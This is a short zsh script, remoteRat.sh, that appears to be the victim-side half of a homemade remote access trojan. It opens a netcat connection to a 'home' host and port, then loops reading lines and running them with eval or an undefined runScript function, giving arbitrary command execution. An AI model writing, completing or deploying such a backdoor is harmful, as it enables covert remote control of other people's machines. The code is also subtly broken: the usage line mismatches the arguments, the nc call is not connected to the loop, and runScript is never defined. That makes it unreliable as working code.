#! /bin/zsh
#
#Description: 
#Executes commands from localRat
#
#Usage: zsh remoteRat.sh port1 [port2] [port3]

#Parsing host and ports into variables
HOMEHOST=$1
HOMEPORT1=$2
HOMEPORT2=${3:-$((HOMEPORT1+1))}
HOMEPORT3=${4:-$((HOMEPORT2+1))}

#Create connection with local rat
nc ${HOMEHOST} ${HOMEPORT1}

while true
do
    #Prompt user for input
    echo -n '$ '
    read -r INPUT
    
    #Run script or execute commnad
    if [[ ${INPUT:0:1} == '!' ]] then
        runScript
        else
        eval $INPUT
    fi
done